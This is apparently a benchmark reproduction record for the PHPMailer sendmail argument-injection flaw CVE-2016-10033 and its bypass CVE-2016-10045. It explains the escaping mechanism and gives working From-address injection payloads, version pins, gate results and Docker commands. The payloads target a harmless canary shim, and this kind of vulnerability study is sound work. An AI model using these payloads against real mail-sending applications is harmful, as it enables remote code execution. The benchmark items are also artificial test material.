PatchClosure-Bench repro — phpmailer-cve-2016-10045
Pair: CVE-2016-10033 (original) -> CVE-2016-10045 (incomplete-fix TARGET)
Product: PHPMailer (PHP mail library). Root cause: sendmail argument injection (CWE-88/CWE-77).
Gate variant: A (same `-f<Sender>` sendmail-param sink for seed and residual).
Date: 2026-07-11   Runtime: real Docker (php:7.4-cli), one image pcb-phpmailer-core:core.

RELATIONSHIP VERDICT: genuine, textbook incomplete fix.
  CVE-2016-10033 (Golunski) = RCE via a crafted From/Sender address that injects extra sendmail
  arguments (-X<path> logs the message body -- a PHP web-shell -- to a web-accessible file). The
  5.2.18 patch (validateAddress + escapeshellarg on the Sender) was INCOMPLETE: CVE-2016-10045 showed
  that embedding a single quote defeats escapeshellarg through its improper interaction with the
  php_escape_shell_cmd() escaping PHP's own mail() applies to additional_parameters. 5.2.20 closed it
  with a strict isShellSafe() allowlist.

EXACT MECHANISM (pinned from the class.phpmailer.php diffs, function mailSend()):
  V0 5.2.17:  $params = sprintf('-f%s', $this->Sender);                         // RAW
  V1 5.2.18:  if (!empty($this->Sender) and $this->validateAddress($this->Sender)) {
                  $params = sprintf('-f%s', escapeshellarg($this->Sender)); }   // CVE-2016-10033 fix
  V2 5.2.20:  // CVE-2016-10033, CVE-2016-10045: Don't pass -f if characters will be escaped.
              if (self::isShellSafe($this->Sender)) { $params = sprintf('-f%s', $this->Sender); }
  isShellSafe() rejects any char outside [alnum]@_-. (spaces + quotes included) AND requires
  escapeshellcmd/escapeshellarg to be no-ops.

  Sink path: setFrom($userinput) -> (validateAddress passes) -> $this->Sender=$userinput ->
             send()/mailSend() -> mail($to,$sub,$body,$hdr, $params) -> PHP applies
             php_escape_shell_cmd($params) -> sh -c "<sendmail_path> ... $params".
  The "improper interaction" (per NVD CVE-2016-10045): escapeshellarg wraps the value in a MATCHED
  pair of single quotes; php_escape_shell_cmd copies matched-quote sections verbatim, so a payload
  with NO interior single quote stays inert (seed -> blocked on V1). But a payload WITH an interior
  single quote makes escapeshellarg emit the `'\''` sequence; php_escape_shell_cmd then re-parses
  those quotes and escapes the interior backslash, tearing the wrapper open so the shell word-splits
  the `-X/canary/out.txt` back out into a standalone sendmail argument (residual -> reaches on V1).

PAYLOADS (benign canary: -X points at /canary/out.txt; the shim copies the planted ${PCB_FLAG} there
          iff a STANDALONE -X<path> token survives to sendmail):
  seed     (CVE-2016-10033): From = "a'\" -X/canary/out.txt \"b"@x.com   (double-quote form, no interior ')
  residual (CVE-2016-10045): From = "a' -X/canary/out.txt b"@x.com       (interior single quote)
  Both are valid RFC5322 addresses -> pass validateAddress()'s default 'pcre8' validator on php:7.4.

VERSIONS / REFS (recipe = unmodified published class.phpmailer.php from PHPMailer GitHub tags):
  V0 = PHPMailer 5.2.17 (tag v5.2.17)  HARNESS_VER=v0  port 39710
  V1 = PHPMailer 5.2.18 (tag v5.2.18)  HARNESS_VER=v1  port 39711   <- TARGET (=CVE-2016-10033-patched)
  V2 = PHPMailer 5.2.20 (tag v5.2.20)  HARNESS_VER=v2  port 39712   <- CVE-2016-10045 fix (neg control)

CANARY: entrypoint plants ${PCB_FLAG} at /canary/flag.txt (outside the app). Benign /usr/local/bin/
  sendmail shim (sendmail_path) records argv; on a standalone -X<path> token it copies flag.txt to
  <path>. No real MTA, no shell payload, no network. Harness reads /canary/out.txt back as canary_out.

=== GATE RESULT (real Docker; FLAG=PCBFLAG_0d6f310fb2331265e6240c6e0da5aef5) ===
  original_poc_reaches_flag_on_v0 : true
  original_poc_blocked_on_v1      : true
  bypass_poc_reaches_flag_on_v1   : true
  passed                          : true
  residual_blocked_on_v2 (neg ctl): true

Per-probe observable (canary_out; send_ok=true in ALL four -> mail() always runs, only injection differs):
  seed     @ v0 (5.2.17): canary_out = PCBFLAG_0d6f310fb2331265e6240c6e0da5aef5   (REACHES)
  seed     @ v1 (5.2.18): canary_out = ""                                          (BLOCKED by escapeshellarg)
  residual @ v1 (5.2.18): canary_out = PCBFLAG_0d6f310fb2331265e6240c6e0da5aef5   (REACHES -> incomplete fix)
  residual @ v2 (5.2.20): canary_out = ""                                          (BLOCKED by isShellSafe)

REPRODUCE:
  export PCB_FLAG="PCBFLAG_$(python3 -c 'import secrets;print(secrets.token_hex(16))')"
  docker compose --profile v0 --profile v1 --profile v2 up -d --build
  python3 oracle.py --wait --v2         # -> "passed": true, "residual_blocked_on_v2": true
TEARDOWN:
  PCB_FLAG=teardown docker compose --profile v0 --profile v1 --profile v2 down -v --rmi all
  docker image prune -f
